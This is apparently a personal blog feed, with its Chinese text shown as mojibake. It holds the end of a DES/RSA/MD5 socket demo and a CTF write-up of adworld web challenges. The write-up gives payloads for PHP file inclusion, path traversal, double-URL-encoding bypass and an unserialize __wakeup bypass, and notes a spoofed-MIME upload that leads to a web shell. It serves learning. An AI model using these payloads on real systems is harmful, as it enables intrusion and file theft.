class="hljs-string">&quot;è§£å¯†åçš„å¯†é’¥&quot;</span>, int_key)    print(<span class="hljs-string">&quot;----&quot;</span>*<span class="hljs-number">10</span>)         <span class="hljs-comment"># æ¥æ”¶å¯†æ–‡çš„é•¿åº¦ï¼ˆä¸ºäº†æ–¹ä¾¿å­˜å‚¨ï¼‰</span>    con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)    length = con.recv(<span class="hljs-number">1024</span>)    length = <span class="hljs-built_in">int</span>(length.decode())    buff = []    size = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> size &lt; length:    <span class="hljs-comment"># å¼€å§‹æ¥å—å¯†æ–‡</span>        dat = con.recv(<span class="hljs-number">1024</span>)        size += <span class="hljs-built_in">len</span>(dat.decode())        buff.append(dat)    data = <span class="hljs-string">b&#x27;&#x27;</span>.join(buff)    bin_cipher = data.decode()    cipher = bin_to_str(bin_cipher)    bin_key = <span class="hljs-built_in">bin</span>(int_key)[<span class="hljs-number">2</span>:]      <span class="hljs-comment"># å°†å¯†é’¥è½¬æ¢æˆäºŒè¿›åˆ¶æ•°</span>    print(<span class="hljs-string">&quot;è§£å¯†ä¼ è¾“å†…å®¹:&quot;</span>)    print(libnum.b2s(DES_decode(cipher, bin_key))) <span class="hljs-comment">#æ‰“å°å‡ºè§£å¯†åçš„æ˜æ–‡</span>    message = <span class="hljs-string">&quot;Bob received the file successfully!&quot;</span>    con.send(<span class="hljs-built_in">bytes</span>(message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    con.recv(<span class="hljs-number">1024</span>).decode()    hash_message = md5(message)    crypt_message = <span class="hljs-built_in">str</span>(RSAEncode(hash_message,d,n))    con.send(<span class="hljs-built_in">bytes</span>(crypt_message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    <span class="hljs-keyword">break</span>server.close()</code></pre><p>file_decode</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/1/3 23:17</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : file_decode.py</span><span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_key</span>():</span>  <span class="hljs-comment"># ç”Ÿæˆ64ä½çš„å¯¹ç§°åŠ å¯†çš„å¯†é’¥</span>    <span class="hljs-built_in">list</span> = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):        c = random.choice([<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>])        <span class="hljs-built_in">list</span>.append(c)    res = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>)    <span class="hljs-keyword">return</span> res<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_file</span>():</span>    <span class="hljs-keyword">try</span>:        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;text.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>, encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)        text = f.read()        f.close()        print(<span class="hljs-string">&quot;è¯»å–æˆåŠŸ!&quot;</span>)        <span class="hljs-keyword">return</span> text    <span class="hljs-keyword">except</span> IOError:        print(<span class="hljs-string">&quot;è¯»å–é”™è¯¯!&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin_to_str</span>(<span class="hljs-params">bin_str</span>) :</span>   <span class="hljs-comment"># 8ä½äºŒè¿›åˆ¶è½¬å­—ç¬¦ï¼Œç”¨äºbobæ”¶åˆ°å¯†åä½¿ç”¨</span>    res = <span class="hljs-string">&quot;&quot;</span>    tmp = re.findall(<span class="hljs-string">r&#x27;.&#123;8&#125;&#x27;</span>,bin_str)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp :        res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>))    <span class="hljs-keyword">return</span> res</code></pre>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¤å…¸å¯†ç </tag>
      
      <tag>DES</tag>
      
      <tag>RSA</tag>
      
      <tag>MD5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adworld</title>
    <link href="/2020/11/30/adworld/"/>
    <url>/2020/11/30/adworld/</url>
    
    <content type="html"><![CDATA[<p>ä¸ºäº†å®Œæˆç½‘å®‰ä½œä¸šå¿…é¡»å¤šåšç‚¹é¢˜ï¼Œé¡ºä¾¿å†™wp</p><span id="more"></span><h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>åˆ©ç”¨phpä¼ªåè®®ä¸Šä¼ ä¸€æ®µphpä»£ç åæ‰§è¡Œï¼Œåˆ—å‡ºç›®å½•çœ‹åˆ°flagæ–‡ä»¶</p><img src="https://i.loli.net/2020/12/04/ApRxaQX5nhbdD87.png" alt="image-20201204225248794" style="zoom:50%;"><p>å†åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–flag</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">220.249.52.133:46457</span>/?page=http://<span class="hljs-number">127.0.0.1</span>/index.php/?hello=%<span class="hljs-number">3</span>C?show_source(%<span class="hljs-number">22</span>fl<span class="hljs-number">4</span>gisisish<span class="hljs-number">3</span>r<span class="hljs-number">3</span>.php%<span class="hljs-number">22</span>);?%<span class="hljs-number">3</span>E</code></pre><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>æŸ¥çœ‹æºç çœ‹åˆ°source.phpï¼Œè®¿é—®çœ‹åˆ°æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><span class="hljs-class">    </span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-variable">$_page</span> = mb_substr(                <span class="hljs-variable">$page</span>,                <span class="hljs-number">0</span>,                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)            );            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);            <span class="hljs-variable">$_page</span> = mb_substr(                <span class="hljs-variable">$_page</span>,                <span class="hljs-number">0</span>,                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)            );            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])    ) &#123;        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];        <span class="hljs-keyword">exit</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;    &#125;  <span class="hljs-meta">?&gt;</span></code></pre><p>æºç ä¸­æœ‰ä¸€ä¸ªhint.phpï¼ŒæŸ¥çœ‹å¾—åˆ°</p><pre><code class="hljs smali">flag<span class="hljs-built_in"> not </span>here,<span class="hljs-built_in"> and </span>flag in ffffllllaaaagggg</code></pre><p>è®¿é—® <code>ffffllllaaaagggg</code>ï¼Œå‘ç°æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯åœ¨æ ¹ç›®å½•ã€‚</p><p>ç»§ç»­çœ‹ä»£ç æœ‰ä¸ªç™½åå•</p><pre><code class="hljs axapta">source.php,<span class="hljs-keyword">hint</span>.php</code></pre><p>mb_substrå‡½æ•°ä¼šæˆªå–<code>?</code>å‰é¢çš„å­—ç¬¦è¿”å›ç»™pageï¼Œæ£€æµ‹å…¶æ˜¯å¦åœ¨ç™½åå•ä¸­</p><p>æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªurldecode()ï¼Œæ‰€ä»¥æäº¤å‰éœ€è¦è¿›è¡Œä¸¤æ¬¡urlencode</p><p>è§£ç åé‡å¤ä¸Šé¢ä¸¤æ­¥</p><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = mb_substr(<span class="hljs-variable">$_page</span>,<span class="hljs-number">0</span>,mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>));<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;   <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;</code></pre><p>ä¹‹åé€šè¿‡includeå‡½æ•°è·å–flag</p><p>æ‰€ä»¥æ„é€ çš„payloadä¸­urlè§£ç å?å‰çš„å†…å®¹å¿…é¡»æ˜¯  <code>source.php</code>æˆ–è€…<code>hint.php</code></p><p>payload:</p><pre><code class="hljs awk">GET:?page=hint.php%<span class="hljs-number">253</span>F<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg</code></pre><p>åŸç†æ˜¯<code>hint.php?/</code>è¢«å½“ä½œç›®å½•</p><p>../æ˜¯è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œè¿™é‡Œå¤šå‡ ä¸ª../ä¹Ÿæ²¡äº‹ï¼Œå¿…é¡»ä¿è¯è¿”å›åˆ°æ ¹ç›®å½•ï¼Œè€Œåœ¨æ ¹ç›®å½•å‘ä¸Šè¿”å›è¿˜æ˜¯æ ¹ç›®å½•ã€‚</p><p>æ‰€ä»¥ä¸Šé¢çš„payloadå¯ä»¥åœ¨æ ¹ç›®å½•è¯»å–åˆ°flagã€‚</p><h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>ä¸‹è½½é™„ä»¶æ‰“å¼€åæ˜¾ç¤ºæœ‰ä¹±ç ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œäºæ˜¯æ”¹åç¼€ä¼ªhtml ,åœ¨æµè§ˆå™¨æ‰“å¼€ï¼Œå‡ºç°ä¸€ä¸ªè¾“å…¥æ¡†ã€‚</p><p>ç»§ç»­çœ‹ä»£ç ï¼Œçœ‹åˆ°å‡½æ•°çš„æœ€åæœ‰ä¸ª<code>eval</code>å‡½æ•°ï¼Œä¸­é—´çš„å‚æ•°ä¸ºeval(_)ï¼Œæ­£å¥½ä¸å¼€å¤´å®šä¹‰çš„åç›¸åŒ<code>&lt;script&gt;_=&#39;function</code>ï¼Œæ‰€ä»¥æƒ³åŠæ³•æŠŠåŸå‡½æ•°æ˜¾ç¤ºå¤„ç†</p><p>å°†evalæ”¹ä¸ºalertï¼Œä¿å­˜ååœ¨æµè§ˆå™¨ä¸­æ‰“å¼€çœ‹åˆ°å¼¹æ¡†ä¸­å‡ºç°æºç ã€‚</p><p>åœ¨çº¿æ ¼å¼åŒ–åçš„ç»“æœ</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;c&quot;</span>).value;    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];        <span class="hljs-keyword">var</span> s = [t, n, r, i];        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)        &#125;    &#125;&#125;<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);<span class="hljs-keyword">delete</span> _</code></pre><p>å†çœ‹è¿™æ®µjsä»£ç ä¸­çš„ifè¯­å¥</p><pre><code class="hljs js"><span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>)</code></pre><p>å‚æ•°eçš„é•¿åº¦ä¸º16ï¼Œå…¶ä¸­è¦åŒ…å«</p><pre><code class="hljs apache"><span class="hljs-attribute">be0f23</span>å¼€å¤´  <span class="hljs-number">233</span>ac   e<span class="hljs-number">98</span>aaç»“å°¾     c<span class="hljs-number">7</span>be<span class="hljs-number">9</span></code></pre><p>é€šè¿‡ifè¯­å¥åä¼šé€šè¿‡ä¸€ä¸ªç®—æ³•å°†flagç®—å‡ºæ¥</p><p>ok,é‚£å°±æŒ‰ifè¯­å¥çš„è¦æ±‚å†™å‡ºe</p><pre><code class="hljs plain">be0f233ac7be98aa</code></pre><p>è¿˜å¯ä»¥ç›´æ¥åˆ©ç”¨</p><pre><code class="hljs js"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];      <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];      <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];      <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];      <span class="hljs-keyword">var</span> s = [t, n, r, i];      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;          <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);          s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)      &#125;</code></pre><p>åœ¨æµè§ˆå™¨çš„consoleä¸­è¿è¡Œ</p><p><img src="https://i.loli.net/2020/12/01/fA5vLyShNcro2Ow.png" alt="image-20201201230236591"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;    <span class="hljs-variable">$_o</span>=strrev(<span class="hljs-variable">$str</span>);    <span class="hljs-comment">// echo $_o;</span>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;strlen(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;               <span class="hljs-variable">$_c</span>=substr(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);        <span class="hljs-variable">$__</span>=ord(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;        <span class="hljs-variable">$_c</span>=chr(<span class="hljs-variable">$__</span>);        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;       &#125;     <span class="hljs-keyword">return</span> str_rot13(strrev(base64_encode(<span class="hljs-variable">$_</span>)));&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">/*</span><span class="hljs-comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span><span class="hljs-comment">*/</span><span class="hljs-meta">?&gt;</span></code></pre><p>äº†è§£å‡ ä¸ªå‡½æ•°çš„ç”¨æ³•</p><blockquote><p>str_rot13() å‡½æ•°å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚</p><p>ROT13 ç¼–ç æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚</p><p><strong>æç¤ºï¼š</strong>ç¼–ç å’Œè§£ç éƒ½æ˜¯ç”±ç›¸åŒçš„å‡½æ•°å®Œæˆçš„ã€‚å¦‚æœæ‚¨æŠŠå·²ç¼–ç çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆå°†è¿”å›åŸå§‹å­—ç¬¦ä¸²ã€‚</p><p>strrev() å‡½æ•°åè½¬å­—ç¬¦ä¸²ã€‚</p></blockquote><p><img src="https://i.loli.net/2020/12/01/LMmUQRWEsx8jceg.png" alt="image-20201201232139218"></p><p>è§£å¯†è„šæœ¬</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;    <span class="hljs-variable">$s</span> = base64_decode(strrev(str_rot13(<span class="hljs-variable">$str</span>)));    <span class="hljs-comment">//echo($s);</span>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;strlen(<span class="hljs-variable">$s</span>);<span class="hljs-variable">$_0</span>++)&#123;        <span class="hljs-variable">$_c</span>=substr(<span class="hljs-variable">$s</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);        <span class="hljs-variable">$__</span>=ord(<span class="hljs-variable">$_c</span>)<span class="hljs-number">-1</span>;        <span class="hljs-variable">$_c</span>=chr(<span class="hljs-variable">$__</span>);        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;    &#125;    <span class="hljs-keyword">echo</span> strrev(<span class="hljs-variable">$_</span>);&#125;decode(<span class="hljs-variable">$str</span>);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>è¿™é¢˜åº”è¯¥ç»™ä¸ªæç¤ºçš„ï¼Œè®¿é—®index.phpsè·å–æºç ã€‚</p><p>phpsï¼Œç”¨å¾¡å‰‘å’Œdirsearchéƒ½æ‰«ä¸å‡ºæ¥ï¼Œæ‰€ä»¥å¿…é¡»çŸ¥é“æ‰å¯èƒ½åšå‡ºæ¥ã€‚</p><p>ç»™æ–°ç”Ÿèµ›å‡ºé¢˜çš„æƒ³æ³•æ¥æºï¼Œå½“æ—¶åšè¿™é¢˜çš„æ—¶å€™è´¹äº†å¥½å¤§åŠ²æ‰æ‰¾åˆ°index.phpsï¼Œæ‰€ä»¥ä¹Ÿè®©è®©èŒæ–°ä»¬ä½“éªŒä¸€ä¸‹æ‰¾ä¸åˆ°çš„ç»æœ›ğŸ¤£</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>===<span class="hljs-variable">$_GET</span>[id]) &#123;  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);  <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span>Can you anthenticate to this website?</code></pre><p>è·å–idåurldecodeä¹‹åå†èµ‹å€¼ç»™idï¼Œè¦æ³¨æ„ä¸Šä¼ çš„å‚æ•°æµè§ˆå™¨ä¼šå­—æ®µä¸€æ¬¡urldecodeï¼Œæ‰€ä»¥è¿™é‡Œçš„adminéœ€è¦ä¸¤æ¬¡urlencode</p><p>payloadï¼š</p><pre><code class="hljs xquery">admin<span class="hljs-meta">%61</span><span class="hljs-meta">%64</span><span class="hljs-meta">%6D</span><span class="hljs-meta">%69</span><span class="hljs-meta">%6E</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span>GET:<span class="hljs-built_in">?id</span>=<span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span></code></pre><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>å¾ˆç®€å•çš„unserialize</p><p>åˆ©ç”¨æ¼æ´ï¼Œå½“å±æ€§å€¼å¤§äºçœŸæ˜¯å±æ€§å€¼çš„æ—¶å€™ä¼šè·³è¿‡wakeupå‡½æ•°ï¼Œphpç‰ˆæœ¬å°äº5.6</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-comment">// public function __wakeup()&#123;</span><span class="hljs-comment">//     exit(&#x27;bad requests&#x27;);</span><span class="hljs-comment">// &#125;</span>&#125;<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> xctf();<span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$c</span>));<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;GET:?code=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;</code></pre><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>æŠ“åŒ…ä¿®æ”¹MIMEä¸ºimage/jpeg,å³å¯ä¸Šä¼ æˆåŠŸï¼Œä¹‹åèšå‰‘è¿æ¥æ‹¿åˆ°flagã€‚</p><h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>æ¨¡æ¿æ³¨å…¥ï¼Œå’Œcumtctfåä¸ºæ¯å¾ˆåƒï¼Œä½†æ˜¯æ²¡é‚£ä¸ªéš¾ã€‚</p><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œåœ¨urlåè¾“å…¥ 49ï¼Œæ˜¾ç¤ºé¡µé¢å¦‚ä¸‹ï¼Œå¯ä»¥ç¡®å®šå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å€¼è¢«å…¶å½“ä½œå˜é‡å¸¦å…¥è®¡ç®—ã€‚</p><p><img src="https://i.loli.net/2020/12/02/NyPSIhg9Yv4Jbzp.png" alt="20201202085851.png"></p><p>æ¨¡æ¿æ³¨å…¥åŸç†è¿™ç¯‡åšå®¢å†™çš„å¾ˆè¯¦ç»†ï¼š<a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p><p>å‡ ä¸ªå¸¸ç”¨çš„é­”æœ¯æ–¹æ³•</p><blockquote><p>_<em>class_</em>  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ </p><p>_<em>mro_</em>    